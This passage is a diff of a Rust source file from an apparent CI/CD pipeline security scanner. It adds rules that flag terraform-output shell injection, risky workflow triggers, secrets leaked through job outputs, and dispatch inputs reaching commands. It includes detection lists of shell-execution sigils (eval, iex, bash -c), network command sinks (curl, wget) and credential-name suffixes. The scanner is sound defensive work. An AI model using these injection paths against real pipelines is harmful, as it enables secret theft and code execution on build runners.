@@ -3,13 +3,18 @@ use crate::finding::{
 };
 use crate::graph::{
     is_docker_digest_pinned, is_sha_pinned, AuthorityCompleteness, AuthorityGraph, EdgeKind,
-    IdentityScope, NodeId, NodeKind, TrustZone, META_ADD_SPN_TO_ENV, META_ATTESTS,
-    META_CHECKOUT_SELF, META_CLI_FLAG_EXPOSED, META_CONTAINER, META_DIGEST, META_ENV_APPROVAL,
-    META_FORK_CHECK, META_IDENTITY_SCOPE, META_IMPLICIT, META_JOB_NAME,
-    META_NO_WORKFLOW_PERMISSIONS, META_OIDC, META_PERMISSIONS, META_PLATFORM, META_READS_ENV,
-    META_REPOSITORIES, META_RULES_PROTECTED_ONLY, META_SCRIPT_BODY, META_SELF_HOSTED,
-    META_SERVICE_CONNECTION, META_SERVICE_CONNECTION_NAME, META_TERRAFORM_AUTO_APPROVE,
-    META_TRIGGER, META_VARIABLE_GROUP, META_WRITES_ENV_GATE,
+    IdentityScope, NodeId, NodeKind, TrustZone, META_ADD_SPN_TO_ENV, META_ATTESTS, META_CACHE_KEY,
+    META_CHECKOUT_REF, META_CHECKOUT_SELF, META_CLI_FLAG_EXPOSED, META_CONTAINER, META_DIGEST,
+    META_DISPATCH_INPUTS, META_DOTENV_FILE, META_DOWNLOADS_ARTIFACT, META_ENVIRONMENT_NAME,
+    META_ENVIRONMENT_URL, META_ENV_APPROVAL, META_FORK_CHECK, META_GITLAB_ALLOW_FAILURE,
+    META_GITLAB_CACHE_KEY, META_GITLAB_CACHE_POLICY, META_GITLAB_DIND_SERVICE, META_GITLAB_EXTENDS,
+    META_GITLAB_INCLUDES, META_GITLAB_TRIGGER_KIND, META_IDENTITY_SCOPE, META_IMPLICIT,
+    META_INTERACTIVE_DEBUG, META_INTERPRETS_ARTIFACT, META_JOB_NAME, META_JOB_OUTPUTS, META_NEEDS,
+    META_NO_WORKFLOW_PERMISSIONS, META_OIDC, META_OIDC_AUDIENCE, META_PERMISSIONS, META_PLATFORM,
+    META_READS_ENV, META_REPOSITORIES, META_RULES_PROTECTED_ONLY, META_SCRIPT_BODY,
+    META_SECRETS_INHERIT, META_SELF_HOSTED, META_SERVICE_CONNECTION, META_SERVICE_CONNECTION_NAME,
+    META_TERRAFORM_AUTO_APPROVE, META_TRIGGER, META_TRIGGERS, META_VARIABLE_GROUP,
+    META_WRITES_ENV_GATE,
 };
 use crate::propagation;
 
@@ -2649,6 +2654,258 @@ pub fn parameter_interpolation_into_shell(graph: &AuthorityGraph) -> Vec<Finding
     findings
 }
 
+/// Rule: ADO terraform-output → `task.setvariable` → downstream shell
+/// expansion, a 2-step injection chain.
+///
+/// **Phase 1 (capture step):** an inline ADO script body
+/// (`META_SCRIPT_BODY`) that contains BOTH:
+///   - a "terraform output capture" signal — either a literal `terraform
+///     output` CLI invocation (with or without `-raw <name>` / `-json`),
+///     OR a reference to a `TF_OUT_*` env var (the standard naming
+///     convention for env vars sourced from a `TerraformCLI@*`
+///     `command: output` task), AND
+///   - a `##vso[task.setvariable variable=NAME ...]VALUE` directive.
+///
+/// **Phase 2 (sink step):** a *later* Step in the SAME job (matched via
+/// `META_JOB_NAME`) whose script body expands `$(NAME)` in
+/// shell-expansion position, where "shell-expansion position" is any of:
+///   - inside `bash -c "..."` / `bash -c '...'`
+///   - inside `eval "..."` / `eval '...'` / `eval $(...)`
+///   - inside command substitution `$(... $(NAME) ...)`
+///   - PowerShell `-split` / `Invoke-Command` / `Invoke-Expression` / `iex`
+///     in the same script
+///   - bare unquoted `$(NAME)` as a command word (line-leading)
+///
+/// **Severity: High.** Terraform state/outputs are often controlled by
+/// remote backends (S3 bucket, Azure Storage) whose IAM may have weaker
+/// access controls than the pipeline itself. The `task.setvariable` hop
+/// launders attacker-controlled state through pipeline-variable space —
+/// existing rules see only the in-step view.
+pub fn terraform_output_via_setvariable_shell_expansion(graph: &AuthorityGraph) -> Vec<Finding> {
+    // Step 0: collect every Step (in graph insertion order, which matches
+    // YAML order) that carries a non-empty script body. Group by job name.
+    struct StepInfo<'a> {
+        id: NodeId,
+        name: &'a str,
+        body: &'a str,
+    }
+    let mut by_job: std::collections::BTreeMap<&str, Vec<StepInfo<'_>>> =
+        std::collections::BTreeMap::new();
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let body = match step.metadata.get(META_SCRIPT_BODY) {
+            Some(b) if !b.is_empty() => b.as_str(),
+            _ => continue,
+        };
+        let job = step
+            .metadata
+            .get(META_JOB_NAME)
+            .map(String::as_str)
+            .unwrap_or("");
+        by_job.entry(job).or_default().push(StepInfo {
+            id: step.id,
+            name: step.name.as_str(),
+            body,
+        });
+    }
+
+    let mut findings = Vec::new();
+
+    for (_job_name, steps) in by_job.iter() {
+        // Phase 1: scan every step in this job for capture+setvariable.
+        // Each capture step yields zero-or-more (variable_name) outputs.
+        let captures: Vec<(usize, Vec<String>)> = steps
+            .iter()
+            .enumerate()
+            .filter_map(|(idx, s)| {
+                let vars = capture_phase_variables(s.body);
+                if vars.is_empty() {
+                    None
+                } else {
+                    Some((idx, vars))
+                }
+            })
+            .collect();
+
+        if captures.is_empty() {
+            continue;
+        }
+
+        // Phase 2: for each capture step, look at all later steps in the
+        // same job. For each later step, find any captured variable name
+        // whose `$(NAME)` reference appears in shell-expansion position
+        // within that later step's body.
+        for (cap_idx, vars) in &captures {
+            for later_idx in (cap_idx + 1)..steps.len() {
+                let sink = &steps[later_idx];
+                let mut hits: Vec<&str> = Vec::new();
+                for var in vars {
+                    if expansion_in_shell_position(sink.body, var) {
+                        hits.push(var.as_str());
+                    }
+                }
+                if hits.is_empty() {
+                    continue;
+                }
+                hits.sort();
+                hits.dedup();
+                let cap = &steps[*cap_idx];
+                let names = hits.join(", ");
+                findings.push(Finding {
+                    severity: Severity::High,
+                    category:
+                        FindingCategory::TerraformOutputViaSetvariableShellExpansion,
+                    path: None,
+                    nodes_involved: vec![cap.id, sink.id],
+                    message: format!(
+                        "Step '{}' captures terraform output and emits ##vso[task.setvariable] for [{}]; later step '{}' (same job) expands $({}) in shell-expansion position — attacker control of terraform state ({{S3, Azure Storage}} backend) becomes shell injection across the pipeline-variable hop",
+                        cap.name,
+                        names,
+                        sink.name,
+                        hits[0],
+                    ),
+                    recommendation: Recommendation::Manual {
+                        action: "Pass the captured value through the downstream step's `env:` block (so the runtime quotes it as a shell variable: `env: { GDSVMS: $(gdsvms) }` then `$GDSVMS` in script) instead of YAML-interpolating `$(VAR)` into the script body. Where the value is structured (comma list of VM names), validate the shape — e.g. `[[ \"$VAR\" =~ ^[a-zA-Z0-9._,-]+$ ]]` — before splitting/looping. Consider lock-down of the terraform state backend (S3 bucket policy, Azure Storage RBAC) so untrusted parties cannot rewrite outputs.".into(),
+                    },
+                    source: FindingSource::BuiltIn,
+                    extras: FindingExtras::default(),
+                });
+            }
+        }
+    }
+
+    findings
+}
+
+/// Phase-1 helper: given an inline-script body, return the list of
+/// pipeline-variable names that the body sets via
+/// `##vso[task.setvariable variable=NAME ...]` *only when* the body also
+/// contains a "terraform output capture" signal.
+///
+/// We do not attempt to data-flow-link the captured value to the
+/// `setvariable` directive — the proximity within a single inline script
+/// is the operative signal. The two corpus exemplars
+/// (`sharedservice-solarwinds` and `userapp-mvit-prd`) both pair the
+/// capture and the setvariable inside the same PowerShell block.
+fn capture_phase_variables(body: &str) -> Vec<String> {
+    if !body_has_terraform_output_capture(body) {
+        return Vec::new();
+    }
+    setvariable_names_in(body)
+}
+
+/// True iff the body contains a terraform-output capture signal.
+fn body_has_terraform_output_capture(body: &str) -> bool {
+    // Literal CLI invocation, with or without subcommand args. We check
+    // case-sensitive because terraform CLI is always lowercase.
+    if body.contains("terraform output") {
+        return true;
+    }
+    // Env-var convention used by the `TerraformCLI@*` task family
+    // (`command: output` writes results into `TF_OUT_<name>` env vars
+    // surfaced into the next step). PowerShell form: `$env:TF_OUT_X`.
+    // POSIX form: `$TF_OUT_X` or `${TF_OUT_X}`.
+    if body.contains("$env:TF_OUT_") || body.contains("${env:TF_OUT_") {
+        return true;
+    }
+    // POSIX shell. Use a manual scan — we want to match `$TF_OUT_X` and
+    // `${TF_OUT_X}` but avoid matching arbitrary substrings like
+    // `MY_TF_OUT_X` that aren't a variable expansion.
+    for marker in ["$TF_OUT_", "${TF_OUT_"] {
+        if body.contains(marker) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Extract the variable names set by every
+/// `##vso[task.setvariable variable=NAME ...]` directive in the body.
+/// Tolerates whitespace and either `;` or `]` as the variable= terminator.
+fn setvariable_names_in(body: &str) -> Vec<String> {
+    let needle = "##vso[task.setvariable variable=";
+    let mut out: Vec<String> = Vec::new();
+    let mut cursor = 0;
+    while let Some(rel) = body[cursor..].find(needle) {
+        let start = cursor + rel + needle.len();
+        let tail = &body[start..];
+        let end = tail
+            .find(|c: char| c == ';' || c == ']' || c.is_whitespace())
+            .unwrap_or(tail.len());
+        let name = tail[..end].trim().to_string();
+        if !name.is_empty()
+            && name
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.')
+        {
+            out.push(name);
+        }
+        cursor = start + end;
+    }
+    out.sort();
+    out.dedup();
+    out
+}
+
+/// Phase-2 predicate: does `body` reference `$(name)` in a shell-expansion
+/// position? "Shell-expansion position" means the value will be parsed by
+/// a shell or PowerShell interpreter at runtime, rather than being fed
+/// into a function/cmdlet that quotes its arguments.
+fn expansion_in_shell_position(body: &str, name: &str) -> bool {
+    let needle = format!("$({name})");
+    if !body.contains(&needle) {
+        return false;
+    }
+    // Cheap whole-body checks: if the script contains any of these
+    // primitives anywhere, an interpolation of `$(name)` elsewhere in the
+    // same script is at risk. The `sharedservice-solarwinds` corpus
+    // exemplar exercises the `-split` + `Invoke-Command` + foreach branch
+    // — all three signals fire.
+    let sigil_set: &[&str] = &[
+        "bash -c",
+        "sh -c",
+        "eval ",
+        "Invoke-Expression",
+        " iex ",
+        "iex(",
+        "iex (",
+        "Invoke-Command",
+        "-split",
+    ];
+    if sigil_set.iter().any(|s| body.contains(s)) {
+        return true;
+    }
+    // Nested command substitution: `$(... $(name) ...)`. We look for any
+    // `$(` occurring strictly before the first `$(name)` — ADO's
+    // `$(macro)` and POSIX `$(cmd)` share the same surface syntax, but
+    // any `$(` *outside* the `$(name)` itself, on the same line, indicates
+    // the sink is being parsed inside another command substitution.
+    for (line_no, line) in body.lines().enumerate() {
+        let _ = line_no;
+        if let Some(pos) = line.find(&needle) {
+            // Search the prefix for an unclosed `$(`. Naive but adequate
+            // for inline-script bodies (we don't attempt to balance).
+            let prefix = &line[..pos];
+            let opens = prefix.matches("$(").count();
+            let closes = prefix.matches(')').count();
+            if opens > closes {
+                return true;
+            }
+        }
+    }
+    // Bare unquoted line-leading reference: `$(NAME) ...` with no
+    // surrounding quotes — the value is parsed as a command line.
+    for line in body.lines() {
+        let trimmed = line.trim_start();
+        if trimmed.starts_with(&needle) {
+            // Skip the obvious assignment-to-variable forms that quote.
+            // PowerShell `$x = "$(name)"` and POSIX `X="$(name)"` keep
+            // the value out of the command position.
+            return true;
+        }
+    }
+    false
+}
+
 /// Run all rules against a graph.
 // ── runtime_script_fetched_from_floating_url ──────────────────
 //
@@ -2973,8 +3230,8 @@ pub fn untrusted_api_response_to_env_sink(graph: &AuthorityGraph) -> Vec<Finding
                 action: "Validate the API field with a strict regex before redirecting (e.g. only `[0-9]+` for a PR number), or write only known-numeric fields. Never pipe free-form fields like branch name or PR title directly into $GITHUB_ENV.".into(),
             },
             source: FindingSource::BuiltIn,
-                extras: FindingExtras::default(),
-});
+            extras: FindingExtras::default(),
+        });
     }
 
     findings
@@ -3067,11 +3324,2391 @@ pub fn pr_build_pushes_image_with_floating_credentials(graph: &AuthorityGraph) -
                 ),
             },
             source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+pub fn run_all_rules(graph: &AuthorityGraph, max_hops: usize) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    // MVP rules
+    findings.extend(authority_propagation(graph, max_hops));
+    findings.extend(over_privileged_identity(graph));
+    findings.extend(unpinned_action(graph));
+    findings.extend(untrusted_with_authority(graph));
+    findings.extend(artifact_boundary_crossing(graph));
+    // Stretch rules
+    findings.extend(long_lived_credential(graph));
+    findings.extend(floating_image(graph));
+    findings.extend(persisted_credential(graph));
+    findings.extend(trigger_context_mismatch(graph));
+    findings.extend(cross_workflow_authority_chain(graph));
+    findings.extend(authority_cycle(graph));
+    findings.extend(uplift_without_attestation(graph));
+    findings.extend(self_mutating_pipeline(graph));
+    findings.extend(checkout_self_pr_exposure(graph));
+    findings.extend(variable_group_in_pr_job(graph));
+    findings.extend(self_hosted_pool_pr_hijack(graph));
+    findings.extend(service_connection_scope_mismatch(graph));
+    findings.extend(template_extends_unpinned_branch(graph));
+    findings.extend(template_repo_ref_is_feature_branch(graph));
+    findings.extend(vm_remote_exec_via_pipeline_secret(graph));
+    findings.extend(short_lived_sas_in_command_line(graph));
+    // ADO inline-script secret-leak rules
+    findings.extend(secret_to_inline_script_env_export(graph));
+    findings.extend(secret_materialised_to_workspace_file(graph));
+    findings.extend(keyvault_secret_to_plaintext(graph));
+    findings.extend(terraform_auto_approve_in_prod(graph));
+    findings.extend(addspn_with_inline_script(graph));
+    findings.extend(parameter_interpolation_into_shell(graph));
+    // GHA red-team-derived rules
+    findings.extend(runtime_script_fetched_from_floating_url(graph));
+    findings.extend(pr_trigger_with_floating_action_ref(graph));
+    findings.extend(untrusted_api_response_to_env_sink(graph));
+    findings.extend(pr_build_pushes_image_with_floating_credentials(graph));
+    findings.extend(secret_via_env_gate_to_untrusted_consumer(graph));
+    // Blue-team positive invariants (negative-space rules — fire on absence
+    // of expected defenses)
+    findings.extend(no_workflow_level_permissions_block(graph));
+    findings.extend(prod_deploy_job_no_environment_gate(graph));
+    findings.extend(long_lived_secret_without_oidc_recommendation(graph));
+    findings.extend(pull_request_workflow_inconsistent_fork_check(graph));
+    findings.extend(gitlab_deploy_job_missing_protected_branch_only(graph));
+    findings.extend(terraform_output_via_setvariable_shell_expansion(graph));
+    // GHA council Bucket 1 rules
+    findings.extend(risky_trigger_with_authority(graph));
+    findings.extend(sensitive_value_in_job_output(graph));
+    findings.extend(manual_dispatch_input_to_url_or_command(graph));
+    // GHA council Bucket 2 rules
+    findings.extend(secrets_inherit_overscoped_passthrough(graph));
+    findings.extend(unsafe_pr_artifact_in_workflow_run_consumer(graph));
+    // GHA council Bucket 3 rules
+    findings.extend(script_injection_via_untrusted_context(graph));
+    findings.extend(interactive_debug_action_in_authority_workflow(graph));
+    findings.extend(pr_specific_cache_key_in_default_branch_consumer(graph));
+    findings.extend(gh_cli_with_default_token_escalating(graph));
+    // GitLab council Bucket A rules
+    findings.extend(ci_job_token_to_external_api(graph));
+    findings.extend(id_token_audience_overscoped(graph));
+    findings.extend(untrusted_ci_var_in_shell_interpolation(graph));
+    // GitLab council Bucket B+C rules
+    findings.extend(unpinned_include_remote_or_branch_ref(graph));
+    findings.extend(dind_service_grants_host_authority(graph));
+    findings.extend(security_job_silently_skipped(graph));
+    findings.extend(child_pipeline_trigger_inherits_authority(graph));
+    findings.extend(cache_key_crosses_trust_boundary(graph));
+    // GitLab red-team Group D rules
+    findings.extend(pat_embedded_in_git_remote_url(graph));
+    findings.extend(ci_token_triggers_downstream_with_variable_passthrough(
+        graph,
+    ));
+    findings.extend(dotenv_artifact_flows_to_privileged_deployment(graph));
+
+    // Blue-team compensating-control suppressions (downgrade or suppress
+    // existing-rule findings when a control elsewhere in the graph
+    // neutralises the risk).
+    apply_compensating_controls(graph, &mut findings);
+
+    apply_confidence_cap(graph, &mut findings);
+
+    findings.sort_by_key(|f| f.severity);
+
+    findings
+}
+
+// ── R3: risky_trigger_with_authority ────────────────────
+// `issue_comment`, `pull_request_review`, `pull_request_review_comment`, and
+// `workflow_run` are high-blast-radius triggers — anyone able to comment on
+// an issue (or any contributor whose previous workflow run completed) can
+// fire the workflow with secrets in scope. `trigger_context_mismatch` only
+// fires on `pull_request_target` / ADO `pr`, so this rule closes the gap.
+
+/// Trigger names that confer the same effective blast radius as
+/// `pull_request_target` once they're paired with write permissions or
+/// non-`GITHUB_TOKEN` secrets. Order is alphabetical for stable output.
+const RISKY_TRIGGERS: &[&str] = &[
+    "issue_comment",
+    "pull_request_review",
+    "pull_request_review_comment",
+    "workflow_run",
+];
+
+/// Returns true if the permissions string declares any GitHub Actions
+/// write-grant scope (`*: write`) or `write-all`. Conservatively flags
+/// any unscoped `write-all`. The check looks for `: write` substrings so
+/// it catches `contents: write`, `pull-requests: write`, `id-token: write`,
+/// etc., regardless of how `Permissions::Map` formats the surrounding map.
+fn permissions_grant_writes(perm_string: &str) -> bool {
+    let p = perm_string.to_lowercase();
+    p.contains("write-all") || p.contains(": write")
+}
+
+/// Rule: high-blast-radius trigger (`issue_comment`,
+/// `pull_request_review[_comment]`, `workflow_run`) declared alongside
+/// write-grant permissions or any non-`GITHUB_TOKEN` secret.
+///
+/// Detection (deterministic, no path traversal):
+/// 1. Read `META_TRIGGERS` (graph metadata) — comma-joined list of every
+///    trigger declared under `on:`.
+/// 2. Filter for entries in `RISKY_TRIGGERS`.
+/// 3. Inspect every Identity node carrying `META_PERMISSIONS` — if any
+///    grants `: write` or `write-all`, the workflow holds write authority.
+/// 4. Scan all Secret nodes; any whose name is not literally `GITHUB_TOKEN`
+///    counts as a non-default secret in scope.
+/// 5. Fire one finding per workflow when steps 1–2 match AND (3 OR 4).
+///
+/// Severity: High. The blast radius matches `pull_request_target` but the
+/// trigger surface is broader (anyone with comment access vs. only PR
+/// authors), so this rule never downgrades by trigger type.
+pub fn risky_trigger_with_authority(graph: &AuthorityGraph) -> Vec<Finding> {
+    let triggers_meta = match graph.metadata.get(META_TRIGGERS) {
+        Some(t) => t,
+        None => return Vec::new(),
+    };
+
+    let risky_present: Vec<&str> = triggers_meta
+        .split(',')
+        .map(str::trim)
+        .filter(|t| RISKY_TRIGGERS.iter().any(|r| r == t))
+        .collect();
+
+    if risky_present.is_empty() {
+        return Vec::new();
+    }
+
+    // (3) Any Identity node with write permissions?
+    let mut writes_identities: Vec<NodeId> = Vec::new();
+    for ident in graph.nodes_of_kind(NodeKind::Identity) {
+        if let Some(perms) = ident.metadata.get(META_PERMISSIONS) {
+            if permissions_grant_writes(perms) {
+                writes_identities.push(ident.id);
+            }
+        }
+    }
+
+    // (4) Any non-GITHUB_TOKEN secret in scope?
+    let non_default_secrets: Vec<NodeId> = graph
+        .nodes_of_kind(NodeKind::Secret)
+        .filter(|s| s.name != "GITHUB_TOKEN")
+        .map(|s| s.id)
+        .collect();
+
+    if writes_identities.is_empty() && non_default_secrets.is_empty() {
+        return Vec::new();
+    }
+
+    let trigger_label = risky_present.join(", ");
+    let cause = if !writes_identities.is_empty() && !non_default_secrets.is_empty() {
+        format!(
+            "{} write-grant identit{} and {} non-default secret{}",
+            writes_identities.len(),
+            if writes_identities.len() == 1 {
+                "y"
+            } else {
+                "ies"
+            },
+            non_default_secrets.len(),
+            if non_default_secrets.len() == 1 {
+                ""
+            } else {
+                "s"
+            },
+        )
+    } else if !writes_identities.is_empty() {
+        format!(
+            "{} write-grant identit{}",
+            writes_identities.len(),
+            if writes_identities.len() == 1 {
+                "y"
+            } else {
+                "ies"
+            },
+        )
+    } else {
+        format!(
+            "{} non-default secret{}",
+            non_default_secrets.len(),
+            if non_default_secrets.len() == 1 {
+                ""
+            } else {
+                "s"
+            },
+        )
+    };
+
+    let mut nodes_involved = writes_identities.clone();
+    nodes_involved.extend(non_default_secrets);
+
+    vec![Finding {
+        severity: Severity::High,
+        category: FindingCategory::RiskyTriggerWithAuthority,
+        path: None,
+        nodes_involved,
+        message: format!(
+            "Workflow trigger(s) [{trigger_label}] grant the same blast radius as pull_request_target but slip past trigger_context_mismatch — {cause} are reachable from any commenter / upstream-run author"
+        ),
+        recommendation: Recommendation::Manual {
+            action: "Drop write-grant permissions to the minimum the trigger requires (most labelers/triagers only need `pull-requests: write` or `issues: write`), or split the workflow: keep the comment-triggered handler authority-free and gate privileged work behind a separate workflow that an authorized user must dispatch manually.".into(),
+        },
+        source: FindingSource::BuiltIn,
+        extras: FindingExtras::default(),
+    }]
+}
+
+// ── R4: sensitive_value_in_job_output ───────────────────
+// `jobs.<id>.outputs.<name>` is written to the run log (only the heuristic
+// mask protects it) and propagates unmasked via `needs.<job>.outputs.*`.
+// Sourcing an output from `secrets.*`, an OIDC-bearing step output, or
+// giving it a credential-shaped name is a structural leak.
+
+/// Suffixes that mark a job-output name as credential-shaped. Matched
+/// case-insensitively against the trailing segment of the output name.
+const CREDENTIAL_NAME_SUFFIXES: &[&str] = &[
+    "_token",
+    "_secret",
+    "_key",
+    "_pem",
+    "_password",
+    "_credential",
+    "_credentials",
+    "_api_key",
+];
+
+/// Returns true if `name` ends with any of `CREDENTIAL_NAME_SUFFIXES`,
+/// matched case-insensitively.
+fn output_name_is_credential_shaped(name: &str) -> bool {
+    let lower = name.to_lowercase();
+    CREDENTIAL_NAME_SUFFIXES.iter().any(|s| lower.ends_with(s))
+}
+
+/// Rule: a `jobs.<id>.outputs.<name>` value is sourced from `secrets.*`, an
+/// OIDC-bearing step output, or has a credential-shaped name (suffix
+/// matches `_token` / `_secret` / `_key` / `_pem` / `_password` /
+/// `_credential[s]` / `_api_key`).
+///
+/// Detection: read `META_JOB_OUTPUTS` (graph metadata) — pipe-delimited
+/// records of `<job>\t<name>\t<source>`. For each record, fire a finding
+/// when `source != "literal"` OR `name` matches a credential suffix.
+///
+/// Severity:
+/// - **Critical** when `source == "secret"` (raw `secrets.*` value).
+/// - **Critical** when `source == "oidc"` (OIDC token leaked via output).
+/// - **High** when `source == "step_output"` AND name is credential-shaped.
+/// - **High** when `source == "literal"` AND name is credential-shaped
+///   (developer is signaling credential intent in the API).
+/// - Otherwise no finding.
+pub fn sensitive_value_in_job_output(graph: &AuthorityGraph) -> Vec<Finding> {
+    let raw = match graph.metadata.get(META_JOB_OUTPUTS) {
+        Some(s) if !s.is_empty() => s,
+        _ => return Vec::new(),
+    };
+
+    let mut findings = Vec::new();
+
+    for record in raw.split('|') {
+        // Format: "<job>\t<name>\t<source>"
+        let mut fields = record.splitn(3, '\t');
+        let job = match fields.next() {
+            Some(j) if !j.is_empty() => j,
+            _ => continue,
+        };
+        let name = match fields.next() {
+            Some(n) if !n.is_empty() => n,
+            _ => continue,
+        };
+        let source = fields.next().unwrap_or("literal");
+
+        let credential_named = output_name_is_credential_shaped(name);
+
+        let (severity, reason) = match source {
+            "secret" => (
+                Severity::Critical,
+                "value reads `secrets.*` directly — exfiltrated to run log and to every downstream `needs.*.outputs.*` consumer",
+            ),
+            "oidc" => (
+                Severity::Critical,
+                "value derives from a step that holds an OIDC identity — the federated token leaks through the output channel",
+            ),
+            "step_output" if credential_named => (
+                Severity::High,
+                "credential-shaped output name backed by a step output — masking is heuristic, downstream consumers see plaintext",
+            ),
+            "literal" if credential_named => (
+                Severity::High,
+                "credential-shaped output name with a literal value — either the value is a hard-coded secret or the contract leaks credentials to downstream jobs",
+            ),
+            _ => continue,
+        };
+
+        findings.push(Finding {
+            severity,
+            category: FindingCategory::SensitiveValueInJobOutput,
+            path: None,
+            nodes_involved: Vec::new(),
+            message: format!(
+                "Job '{job}' declares output '{name}' — {reason}"
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Do not expose secrets, OIDC tokens, or credential-shaped values via `jobs.<id>.outputs.*`. Pass them between steps within a single job using `env:` (which honors masking) or write them to a secure file consumed only by a downstream step. If a downstream job needs to act on a credential, fetch it directly from the secret store inside that job instead of inheriting it through outputs.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+// ── R6: manual_dispatch_input_to_url_or_command ────────
+// `workflow_dispatch.inputs.*` is attacker-controlled in any repository
+// where collaborators have `Actions: write`. Flowing an input value into
+// `curl` / `wget` / `gh api` / a `run:` URL / `actions/checkout` `ref:`
+// gives the dispatcher arbitrary code execution against the runner — a
+// pivot from "can run a workflow" to "can land arbitrary code on a
+// privileged runner".
+
+/// Tokens that indicate command-line consumption of an input value when
+/// they appear in the same `run:` body as the input expression. Each token
+/// must be matched whole-word so we don't false-positive on `curlier` etc.
+const COMMAND_SINKS: &[&str] = &[
+    "curl",
+    "wget",
+    "gh api",
+    "gh release",
+    "gh secret",
+    "gh repo",
+    "git clone",
+    "git fetch",
+];
+
+/// Returns true if `body` contains a whole-word occurrence of `needle`.
+/// "Whole word" = preceded by start-of-string or non-alphanumeric, and
+/// followed by end-of-string or non-alphanumeric. Avoids matching
+/// `curl` inside `curlier` or `git fetch` inside `git fetcher`.
+fn body_contains_command(body: &str, needle: &str) -> bool {
+    let mut start = 0;
+    while let Some(rel) = body[start..].find(needle) {
+        let abs = start + rel;
+        let before_ok = abs == 0
+            || !body
+                .as_bytes()
+                .get(abs - 1)
+                .map(|b| b.is_ascii_alphanumeric() || *b == b'_')
+                .unwrap_or(false);
+        let after_idx = abs + needle.len();
+        let after_ok = after_idx == body.len()
+            || !body
+                .as_bytes()
+                .get(after_idx)
+                .map(|b| b.is_ascii_alphanumeric() || *b == b'_')
+                .unwrap_or(false);
+        if before_ok && after_ok {
+            return true;
+        }
+        start = abs + needle.len();
+    }
+    false
+}
+
+/// Returns true if `body` references the dispatch input `name` via either
+/// `${{ inputs.<name> }}` or `${{ github.event.inputs.<name> }}`. Tolerates
+/// any whitespace inside the `${{ … }}` expression.
+fn body_references_input(body: &str, name: &str) -> bool {
+    // Substring forms — GHA accepts both `inputs.X` and `github.event.inputs.X`.
+    let needle_a = format!("inputs.{name}");
+    let needle_b = format!("github.event.inputs.{name}");
+    body.contains(&needle_a) || body.contains(&needle_b)
+}
+
+/// Rule: a `workflow_dispatch.inputs.*` value flows into a command sink
+/// (`curl`, `wget`, `gh api`, `git clone`, …) or `actions/checkout`
+/// `with.ref:`.
+///
+/// Detection:
+/// 1. Read `META_DISPATCH_INPUTS` — comma-joined list of input names.
+/// 2. For every Step node carrying `META_SCRIPT_BODY`, fire a finding when
+///    the body references any input name AND contains a whole-word
+///    occurrence of any `COMMAND_SINKS` entry.
+/// 3. For every Step node carrying `META_CHECKOUT_REF`, fire a finding when
+///    the ref expression references any input name (the ref is consumed by
+///    `actions/checkout`, which performs `git fetch` / `git checkout`
+///    against the supplied ref).
+///
+/// Severity: High. Dispatch is a privileged operation, but the privileged
+/// surface is bounded to whoever holds `Actions: write` on the repo —
+/// narrower than `pull_request_target`, broader than a maintainer-only
+/// secret.
+pub fn manual_dispatch_input_to_url_or_command(graph: &AuthorityGraph) -> Vec<Finding> {
+    let inputs_meta = match graph.metadata.get(META_DISPATCH_INPUTS) {
+        Some(s) if !s.is_empty() => s,
+        _ => return Vec::new(),
+    };
+
+    let inputs: Vec<&str> = inputs_meta
+        .split(',')
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .collect();
+    if inputs.is_empty() {
+        return Vec::new();
+    }
+
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        // (a) Script body sink
+        if let Some(body) = step.metadata.get(META_SCRIPT_BODY) {
+            let referenced: Vec<&str> = inputs
+                .iter()
+                .copied()
+                .filter(|name| body_references_input(body, name))
+                .collect();
+            if !referenced.is_empty() {
+                let sinks: Vec<&str> = COMMAND_SINKS
+                    .iter()
+                    .copied()
+                    .filter(|s| body_contains_command(body, s))
+                    .collect();
+                if !sinks.is_empty() {
+                    findings.push(Finding {
+                        severity: Severity::High,
+                        category: FindingCategory::ManualDispatchInputToUrlOrCommand,
+                        path: None,
+                        nodes_involved: vec![step.id],
+                        message: format!(
+                            "Step '{}' interpolates workflow_dispatch input(s) [{}] into command sink(s) [{}] — anyone with Actions:write can pivot the run to attacker-controlled hosts/refs",
+                            step.name,
+                            referenced.join(", "),
+                            sinks.join(", "),
+                        ),
+                        recommendation: Recommendation::Manual {
+                            action: "Pass the input through the step's `env:` block (where the runtime quotes it) and reference `\"$INPUT_NAME\"` in the script. For URLs, validate against an allowlist before fetching. Never let a dispatch input land in a `git clone` / `actions/checkout` ref without an explicit allowlist of permitted refs.".into(),
+                        },
+                        source: FindingSource::BuiltIn,
+                        extras: FindingExtras::default(),
+                    });
+                }
+            }
+        }
+
+        // (b) actions/checkout ref sink
+        if let Some(ref_expr) = step.metadata.get(META_CHECKOUT_REF) {
+            let referenced: Vec<&str> = inputs
+                .iter()
+                .copied()
+                .filter(|name| body_references_input(ref_expr, name))
+                .collect();
+            if !referenced.is_empty() {
+                findings.push(Finding {
+                    severity: Severity::High,
+                    category: FindingCategory::ManualDispatchInputToUrlOrCommand,
+                    path: None,
+                    nodes_involved: vec![step.id],
+                    message: format!(
+                        "Step '{}' uses workflow_dispatch input(s) [{}] as the actions/checkout ref — the dispatcher chooses which commit lands on the privileged runner",
+                        step.name,
+                        referenced.join(", "),
+                    ),
+                    recommendation: Recommendation::Manual {
+                        action: "Constrain the dispatch input via a `type: choice` `options:` allowlist of permitted refs/branches, or hard-code the ref and accept a different parameter (e.g. release tag) that maps onto a vetted ref.".into(),
+                    },
+                    source: FindingSource::BuiltIn,
+                    extras: FindingExtras::default(),
+                });
+            }
+        }
+    }
+
+    findings
+}
+/// Set of trigger names whose runs are influenced by parties outside the
+/// repo's write-permission set — anything that can be initiated by opening a
+/// PR, commenting on an issue, or reacting to another workflow's outcome.
+/// Used by `secrets_inherit_overscoped_passthrough` and
+/// `unsafe_pr_artifact_in_workflow_run_consumer` to gate detection.
+const RISKY_TRIGGER_NAMES: &[&str] = &[
+    "pull_request",
+    "pull_request_target",
+    "pull_request_review",
+    "pull_request_review_comment",
+    "issue_comment",
